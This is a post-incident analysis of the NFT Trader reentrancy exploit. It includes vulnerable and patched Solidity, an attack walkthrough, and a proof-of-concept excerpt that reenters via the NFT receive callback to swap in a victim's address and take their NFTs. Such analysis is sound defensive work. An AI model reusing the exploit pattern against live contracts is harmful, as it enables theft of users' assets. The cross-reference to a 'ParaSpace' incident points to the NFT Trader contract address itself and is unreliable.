# NFT Trader — Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-12-16 |
| **Protocol** | NFT Trader (BatchSwap) |
| **Chain** | Ethereum |
| **Loss** | ~$3,000,000 (5 CloneX NFTs + other assets) |
| **Attacker EOA** | [0xb1edf2a0...034d2d](https://etherscan.io/address/0xb1edf2a0ba8bc789cbc3dfbe519737cada034d2d) |
| **Attack Contract** | [0x871f28e5...f5c5](https://etherscan.io/address/0x871f28e58f2a0906e4a56a82aec7f005b411f5c5) |
| **Vulnerable Contract** | [0xC310e760...Ece0](https://etherscan.io/address/0xC310e760778ECBca4C65B6C559874757A4c4Ece0) |
| **Attack Tx** | [0xec752366...393d](https://etherscan.io/tx/0xec7523660f8b66d9e4a5931d97ad8b30acc679c973b20038ba4c15d4336b393d) |
| **Root Cause** | During NFT transfer callback (`onERC721Received`), reentrancy into `editCounterPart` replaces the counterparty address, enabling theft of the victim's NFTs |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/NFTTrader_exp.sol) |

---

## 1. Vulnerability Overview

NFT Trader (contract name: `BatchSwap`) is a P2P trading protocol that facilitates NFT exchanges between two parties. Users create trades via `createSwapIntent`, and the counterparty finalizes them via `closeSwapIntent`.

**Core vulnerability**: When `closeSwapIntent` transfers NFTs via `safeTransferFrom`, it triggers the recipient's `onERC721Received` callback. Even though the state has been marked `Closed` at that point, an attacker can **reenter** and call `editCounterPart` to replace the counterparty address with the victim's address. As a result, the victim's NFTs are transferred to the attacker in the latter half of the swap execution.

Vulnerability structure:
- `closeSwapIntent` changes the state to `Closed` before performing NFT transfers (Effect → Interaction order)
- However, **the counterparty address (`addressTwo`) remains writable in storage while external calls are in progress**
- `editCounterPart` has no `nonReentrant` guard and can be called by anyone (as long as they are the swap creator)
- In the PoC, the attacker set themselves as `addressOne` (swap creator), satisfying the call condition for `editCounterPart`

---

## 2. Vulnerable Code Analysis

### 2.1 `closeSwapIntent` — Reentrancy-Vulnerable Function

```solidity
// [VULNERABLE] BatchSwap.sol - closeSwapIntent core logic
function closeSwapIntent(address _swapCreator, uint256 _swapId)
    payable public whenNotPaused
{
    // ① State validation
    require(swapList[_swapCreator][swapMatch[_swapId]].status == swapStatus.Opened, ...);
    require(swapList[_swapCreator][swapMatch[_swapId]].addressTwo == msg.sender, ...);

    // ② State change (mark as Closed)
    swapList[_swapCreator][swapMatch[_swapId]].addressTwo = msg.sender;
    swapList[_swapCreator][swapMatch[_swapId]].swapEnd = block.timestamp;
    swapList[_swapCreator][swapMatch[_swapId]].status = swapStatus.Closed; // ✅ State closed first

    // ③ Owner1 → Owner2 direction: transfer nftsOne
    for(i=0; i<nftsOne[_swapId].length; i++) {
        if(nftsOne[_swapId][i].typeStd == ERC721) {
            // ❌ safeTransferFrom invokes the recipient's (Owner2 = attacker) onERC721Received
            // ❌ At this point addressTwo is still read from storage, so it can be changed on reentry
            ERC721Interface(...).safeTransferFrom(
                address(this),
                swapList[_swapCreator][swapMatch[_swapId]].addressTwo, // ← Modified during callback!
                nftsOne[_swapId][i].tokenId[0],
                nftsOne[_swapId][i].data
            );
        }
    }

    // ④ Owner2 → Owner1 direction: transfer nftsTwo
    for(i=0; i<nftsTwo[_swapId].length; i++) {
        if(nftsTwo[_swapId][i].typeStd == ERC721) {
            // ❌ addressTwo has been replaced with victim during the callback
            // ❌ Victim's NFT is transferred to addressOne (attacker)
            ERC721Interface(...).safeTransferFrom(
                swapList[_swapCreator][swapMatch[_swapId]].addressTwo, // ← Victim's address!
                swapList[_swapCreator][swapMatch[_swapId]].addressOne, // ← Attacker's address!
                nftsTwo[_swapId][i].tokenId[0],
                nftsTwo[_swapId][i].data
            );
        }
    }
}
```

**Problem**: Even though `status` is changed to `Closed`, `addressTwo` can be overwritten via `editCounterPart` during callback execution. Because the transfer loop repeatedly reads the storage variable (`swapList[...].addressTwo`), if this value is tampered with during the first transfer callback, the subsequent transfer destination changes.

---

### 2.2 `editCounterPart` — State Mutation Function (Reentrancy Entry Point)

```solidity
// [VULNERABLE] Function called during reentrancy — no nonReentrant guard
function editCounterPart(uint256 _swapId, address payable _counterPart) public {
    // ❌ The swap creator (msg.sender == addressOne) can change counterPart at any time
    // ❌ No nonReentrant modifier
    // ❌ Can be called even when swap status is Closed (no status validation!)
    require(
        msg.sender == swapList[msg.sender][swapMatch[_swapId]].addressOne,
        "Message sender must be the swap creator"
    );
    swapList[msg.sender][swapMatch[_swapId]].addressTwo = _counterPart; // ← Direct overwrite
}
```

**Problems**:
1. Allows changing `addressTwo` even when in `swapStatus.Closed` state
2. No `nonReentrant` modifier, allowing reentry from external call callbacks
3. The attacker is the swap creator (`addressOne`), so the call condition is freely satisfied

---

### 2.3 Fixed Code (Patch Example)

```solidity
// [FIXED] Add ReentrancyGuard and state validation to editCounterPart

// Inherit OpenZeppelin ReentrancyGuard
contract BatchSwap is Ownable, Pausable, ReentrancyGuard, IERC721Receiver, IERC1155Receiver {

    // ✅ Add nonReentrant to closeSwapIntent
    function closeSwapIntent(address _swapCreator, uint256 _swapId)
        payable public whenNotPaused nonReentrant  // ← nonReentrant added
    {
        // ... existing logic ...
        
        // ✅ Alternative: cache values from storage into memory so they cannot be changed on reentry
        address payable cachedAddressTwo = swapList[_swapCreator][swapMatch[_swapId]].addressTwo;
        address payable cachedAddressOne = swapList[_swapCreator][swapMatch[_swapId]].addressOne;
        
        // ✅ Transfer using cached addresses (no re-read from storage)
        ERC721Interface(...).safeTransferFrom(address(this), cachedAddressTwo, ...);
        ERC721Interface(...).safeTransferFrom(cachedAddressTwo, cachedAddressOne, ...);
    }

    // ✅ Add state validation to editCounterPart
    function editCounterPart(uint256 _swapId, address payable _counterPart) public {
        require(
            msg.sender == swapList[msg.sender][swapMatch[_swapId]].addressOne,
            "Message sender must be the swap creator"
        );
        // ✅ Only allow counterPart change when swap is in Opened state
        require(
            swapList[msg.sender][swapMatch[_swapId]].status == swapStatus.Opened,
            "Swap is not in opened state"
        );
        swapList[msg.sender][swapMatch[_swapId]].addressTwo = _counterPart;
    }
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

Before executing the attack, the attacker needed to satisfy the following conditions:

1. **Confirm victim's prior approval**: The victim (0x2393...) must have granted `setApprovalForAll` approval to the NFTTrader contract for all CloneX NFTs. On-chain verification confirmed `isApprovedForAll(victim, NFTTrader) = true` in the block immediately before the attack.

2. **Prepare bait NFT**: The attacker mints a Uniswap V3 LP NFT (positionId=625712) for 0.001 ETH to use as the bait asset in the trade.

3. **Approve NFTTrader from attacker contract**: Call `UniV3PosNFT.setApprovalForAll(NFTTrader, true)`.

### 3.2 Execution Phase (per CloneX NFT, repeated 5 times)

```
Step 1: Call createSwapIntent
        - addressOne = attacker contract (0x871f...)
        - addressTwo = attacker contract (self)
        - nftsTwo = [UniV3PosNFT(positionId=625712), CloneX(tokenId=6670)]
        - Pay 0.005 ether fee
        → Result: swapId recorded

Step 2: Call closeSwapIntent (attacker = addressTwo)
        - closeSwapIntent(attackerContract, swapId)
        - status = Closed
        - Loop: transfer nftsOne (empty, skipped)
        - Loop: nftsTwo[0] = UniV3PosNFT.safeTransferFrom(attacker→attacker, positionId)
          → Attacker contract's onERC721Received callback fires ← [REENTRANCY OCCURS]

Step 3: [REENTRY] Inside onERC721Received callback
        - Call NFTTrader.editCounterPart(swapId, victim)
        - swapList[attacker][swapMatch[swapId]].addressTwo = victim (replaced with victim!)
        - Return callback: bytes4(onERC721Received.selector)

Step 4: closeSwapIntent resumes (continues from Step 2)
        - Loop: nftsTwo[1] = CloneX.safeTransferFrom(addressTwo=victim, addressOne=attackerEOA, tokenId=6670)
        - ← addressTwo has been swapped to victim, so victim's NFT is successfully stolen!

Step 5: Repeat the above for tokenIds 6650, 4843, 5432, 9870 (5 times total)
```

### 3.3 Attack Flow ASCII Diagram

```
Attacker EOA (0xb1ed...)
        │
        │ deploy
        ▼
┌─────────────────────┐
│  Attacker Contract  │
│  (0x871f...)        │
│                     │
│  onERC721Received() │◄──────────────────────────────────────┐
│  {                  │                                        │
│    editCounterPart  │──────────────────────────────────────┐ │
│    (swapId, victim) │                                      │ │
│  }                  │                                      │ │
└─────────────────────┘                                      │ │
        │                                                    │ │
        │ createSwapIntent(nftsTwo=[UniV3NFT, CloneX#6670])  │ │
        ▼                                                    │ │
┌─────────────────────────────────────────────────────────┐  │ │
│              NFTTrader (BatchSwap)                      │  │ │
│              (0xC310...)                                │  │ │
│                                                         │  │ │
│  closeSwapIntent():                                     │  │ │
│    [1] status = Closed ✓                                │  │ │
│    [2] addressTwo → attacker (initial value)            │  │ │
│    [3] nftsTwo[0]: UniV3PosNFT.safeTransferFrom()       │──┘ │
│         → onERC721Received callback fires               │    │
│         ← callback complete (addressTwo changed to victim!)  │◄───┘
│    [4] nftsTwo[1]: CloneX.safeTransferFrom(            │
│           from = addressTwo = victim,  ← tampered!     │
│           to   = addressOne = attackerEOA)             │
│         → Victim's CloneX NFT stolen!                   │
└─────────────────────────────────────────────────────────┘
        │
        ▼
┌─────────────────────┐
│  Victim             │
│  (0x2393...)        │
│  CloneX: 5 → 0      │   CloneX #6670, #6650, #4843, #5432, #9870
└─────────────────────┘   5 NFTs stolen in total
```

### 3.4 Outcome

- **Victim loss**: 5 CloneX NFTs (token IDs: 6670, 6650, 4843, 5432, 9870), valued at approximately $3,000,000
- **Attacker gain**: 5 CloneX NFTs (confirmed received by attacker EOA 0xb1ed...)
- **Gas consumed**: 3,226,653 gas (@ 70 Gwei)

---

## 4. PoC Code (DeFiHackLabs — Core Logic + English Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

contract ContractTest is Test {
    // ...key address constants...
    uint256 private swapId; // The swap ID currently under attack

    function testExploit() public {
        // [Prep 1] Create bait NFT: mint a Uniswap V3 LP position NFT
        // List an NFT with near-zero value in the trade to lure the victim
        (uint256 positionId,,,) = UniV3PosNFT.mint{value: 0.001 ether}(params);

        // [Prep 2] Grant NFTTrader permission to transfer UniV3PosNFT
        UniV3PosNFT.setApprovalForAll(address(NFTTrader), true);

        // [Assert] Confirm victim has already granted full CloneX NFT approval to NFTTrader
        require(CloneX.isApprovedForAll(victim, address(NFTTrader)));

        // [Attack loop] Iterate over 5 CloneX NFTs owned by the victim
        for (uint8 i; i < victimsCloneXTokenIds.length; ++i) {

            // [Step 1] Create swap intent
            // - addressTwo = attacker contract itself (later replaced with victim via reentry)
            // - nftsTwo[0] = bait UniV3PosNFT (attacker contract → attacker contract)
            // - nftsTwo[1] = victim's CloneX NFT (target to drain from victim → attacker)
            NFTTrader.createSwapIntent{value: 0.005 ether}(
                _swapIntent,   // addressTwo = attacker contract
                _nftsOne,      // empty array (attacker provides no NFTs)
                _nftsTwo       // [UniV3PosNFT, CloneX victim token]
            );

            // Extract swapId from event logs
            (swapId,) = abi.decode(entries[0].data, (uint256, address));

            // [Step 2] Call swap close
            // → Inside closeSwapIntent, UniV3PosNFT.safeTransferFrom executes
            // → Reentrancy occurs via onERC721Received callback
            NFTTrader.closeSwapIntent{value: 0.005 ether}(address(this), swapId);
        }
    }

    // [KEY REENTRY POINT] ERC721 receive callback
    // Automatically called when UniV3PosNFT is transferred to this contract
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        // ❌ Exploiting reentrancy vulnerability:
        // This callback is triggered during closeSwapIntent execution (right after nftsTwo[0] transfer)
        // At this point, call editCounterPart to replace the counterPart with victim
        // → When nftsTwo[1] is transferred: from=victim, to=attacker
        NFTTrader.editCounterPart(swapId, victim); // ← State manipulation!
        return this.onERC721Received.selector;
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | ERC721 Callback Reentrancy (Cross-Function) | CRITICAL | CWE-841 | `01_reentrancy.md` Pattern 2 | Fei/Rari (2022, $80M), Cream Finance (2021, $130M) |
| V-02 | State Variable Manipulation Allowed During Trade Execution | CRITICAL | CWE-362 | `11_logic_error.md` Temporal Coupling | The DAO (2016) |
| V-03 | `editCounterPart` Unprotected (No State Validation) | HIGH | CWE-284 | `03_access_control.md` | — |

### V-01: ERC721 Callback Reentrancy (Cross-Function Reentrancy)

- **Description**: When `closeSwapIntent` transfers NFTs via `safeTransferFrom`, it triggers the recipient's `onERC721Received` callback. During this callback, the `editCounterPart` function is called to tamper with the counterparty address (`addressTwo`). This is not same-function reentrancy but **cross-function reentrancy**, which cannot be defended against without a `nonReentrant` guard.
- **Impact**: Unauthorized theft of the victim's NFTs. Assets belonging to a third party (victim) who never agreed to the trade are transferred to the attacker.
- **Attack conditions**: (1) Victim has granted `setApprovalForAll` approval to NFTTrader, (2) attacker is the swap creator (`addressOne`), (3) the trade includes ERC721 NFTs.

### V-02: State Variable Manipulation Allowed During Trade Execution

- **Description**: `closeSwapIntent` repeatedly reads `swapList[...].addressTwo` from storage inside the transfer loop. Even after the state is changed to `Closed`, this value remains writable and can be tampered with by a callback during loop execution.
- **Impact**: The transfer destination is manipulated, causing NFTs to be sent to an unintended address.
- **Attack conditions**: An external call (`safeTransferFrom`) occurs before the loop references the storage variable.

### V-03: Missing State Validation in `editCounterPart`

- **Description**: The `editCounterPart` function allows the swap creator to change `addressTwo` at any time, regardless of `swapStatus`. Modification is possible even in `Closed` or `Cancelled` states.
- **Impact**: If the counterPart address is retroactively tampered with after a trade is settled (`Closed`), accounting inconsistencies arise.
- **Attack conditions**: Attacker must be the swap creator.

---

## 6. Remediation Recommendations

### Immediate Actions (Code Level)

**Method 1: Add `nonReentrant` modifier (simplest)**

```solidity
// Inherit OpenZeppelin ReentrancyGuard
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract BatchSwap is Ownable, Pausable, ReentrancyGuard, IERC721Receiver, IERC1155Receiver {

    // ✅ Add nonReentrant to closeSwapIntent, createSwapIntent, and cancelSwapIntent
    function closeSwapIntent(address _swapCreator, uint256 _swapId)
        payable public whenNotPaused nonReentrant  // ← added
    { ... }
}
```

**Method 2: Cache storage variables in memory (strengthen CEI pattern)**

```solidity
function closeSwapIntent(address _swapCreator, uint256 _swapId)
    payable public whenNotPaused
{
    // ✅ Cache critical state into memory before execution
    address payable cachedAddressOne = swapList[_swapCreator][swapMatch[_swapId]].addressOne;
    address payable cachedAddressTwo = swapList[_swapCreator][swapMatch[_swapId]].addressTwo;

    // State change
    swapList[_swapCreator][swapMatch[_swapId]].status = swapStatus.Closed;
    swapList[_swapCreator][swapMatch[_swapId]].swapEnd = block.timestamp;

    // ✅ Use cached addresses (unaffected even if storage is tampered via reentry)
    for (uint256 i = 0; i < nftsTwo[_swapId].length; i++) {
        ERC721Interface(...).safeTransferFrom(
            cachedAddressTwo,  // ← Use cached value, no re-read from storage
            cachedAddressOne,
            ...
        );
    }
}
```

**Method 3: Add state validation to `editCounterPart`**

```solidity
function editCounterPart(uint256 _swapId, address payable _counterPart) public {
    require(
        msg.sender == swapList[msg.sender][swapMatch[_swapId]].addressOne,
        "Message sender must be the swap creator"
    );
    // ✅ Only allow counterPart change when swap is in Opened state
    require(
        swapList[msg.sender][swapMatch[_swapId]].status == swapStatus.Opened,
        "Can only edit counterpart for opened swaps"
    );
    swapList[msg.sender][swapMatch[_swapId]].addressTwo = _counterPart;
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| ERC721 callback reentrancy | Inherit `ReentrancyGuard` and apply `nonReentrant` to all external NFT transfer functions |
| Storage variable reference pattern | Cache critical state values into memory variables before loops (strict CEI pattern) |
| `editCounterPart` access control | Only allow counterPart changes when swap state is `Opened` |
| NFT whitelist | Strengthen whitelist validation to restrict token contracts capable of triggering arbitrary callbacks |
| Emergency pause | Strengthen `Pausable` monitoring mechanisms for immediate activation upon attack detection |

---

## 7. Lessons Learned

1. **NFT `safeTransferFrom` is an implicit external call**: ERC721's `safeTransferFrom` always invokes the `onERC721Received` callback when the recipient is a contract. This callback functions as a full reentrancy vector, so all state-transition functions that include NFT transfers must use `nonReentrant` by default.

2. **The CEI pattern alone is insufficient against cross-function reentrancy**: The Checks-Effects-Interactions pattern defends against same-function reentrancy, but is insufficient for cross-function reentrancy (where storage is manipulated as a side effect of a different function). Defense via a `nonReentrant` lock or memory caching must be used in conjunction.

3. **Repeated storage variable reads inside loops are dangerous**: If a loop containing external calls directly references storage variables, those values can be tampered with during callback execution. All critical state values must be fixed in memory variables before the loop begins.

4. **State-mutating functions must always validate execution context**: Functions that mutate state, like `editCounterPart`, must validate the current swap status (`swapStatus`) to block invalid state transitions. Allowing the counterPart of an already `Closed` trade to be changed was the root cause of this attack.

5. **Atomicity of bidirectional transfers is critical in P2P trading protocols**: Bidirectional NFT exchanges must either both succeed or both fail (atomicity). If state can be tampered with during the first transfer callback, atomicity is broken. Introducing a Pull pattern (where the recipient withdraws directly) should be considered.

6. **Reference to similar cases**: The March 2023 ParaSpace NFT reentrancy incident ([0xC310...](https://etherscan.io/address/0xC310e760778ECBca4C65B6C559874757A4c4Ece0)) also employed a similar ERC721 callback reentrancy pattern. When auditing NFT trading protocols, this class of vulnerability should be the top priority.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount/Outcome Comparison

| Field | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| Attacker EOA | `0xb1edf2a0...034d2d` | `0xb1EdF2a0...034D2D` | ✅ |
| Attack contract | `0x871f28e5...f5c5` | `0x871f28E5...F5c5` | ✅ |
| Vulnerable contract | `0xC310e760...Ece0` | `0xC310e760...Ece0` | ✅ |
| Attack block | `18_799_487` (fork) | `18799488` | ✅ (same range) |
| Victim CloneX balance before attack | 5 | 5 | ✅ |
| Victim CloneX balance after attack | 0 | 0 | ✅ |
| NFTs stolen | 5 | 5 | ✅ |
| gasUsed | — | 3,226,653 | — |
| Tx status | Success | `0x1` (success) | ✅ |

### 8.2 On-Chain NFT Transfer Event Order (within attack Tx)

A total of 15 ERC721 Transfer events occurred in the attack transaction (3 per CloneX NFT: 1 round-trip for UniV3PosNFT + 1 CloneX theft, across 5 sets).

Event pattern per CloneX NFT (e.g., tokenId=6670):

```
① UniV3PosNFT Transfer: attackerContract → attackerContract (positionId=625712)
   (safeTransferFrom call → onERC721Received callback → editCounterPart reentry)

② CloneX Transfer: victim (0x2393...) → attackerContract (0x871f...)
   (nftsTwo loop: from addressTwo=victim, to addressOne=attacker contract)

③ CloneX Transfer: attackerContract (0x871f...) → attackerEOA (0xb1ed...)
   (final NFT withdrawal)
```

Complete theft list:
| CloneX tokenId | Owner Before Attack | Owner After Attack |
|---------------|------------|------------|
| 6670 | Victim (0x2393...) | Attacker EOA (0xb1ed...) |
| 6650 | Victim (0x2393...) | Attacker EOA (0xb1ed...) |
| 4843 | Victim (0x2393...) | Attacker EOA (0xb1ed...) |
| 5432 | Victim (0x2393...) | Attacker EOA (0xb1ed...) |
| 9870 | Victim (0x2393...) | Attacker EOA (0xb1ed...) |

### 8.3 Precondition Verification (at block 18799487)

| Verification Item | Result |
|----------|------|
| `isApprovedForAll(victim, NFTTrader)` | `true` ✅ (attack precondition satisfied) |
| Victim CloneX balance | `5` ✅ |
| CloneX #6670 owner before attack | `0x23938954...B73Db` (victim) ✅ |
| CloneX #6670 owner after attack | `0xb1EdF2a0...034D2D` (attacker EOA) ✅ |

---

*Analysis date: 2026-04-11*
*PoC source: [DeFiHackLabs by SunWeb3Sec](https://github.com/SunWeb3Sec/DeFiHackLabs)*
*Vulnerable contract source: Sourcify verified source (full_match, Solidity 0.7.6)*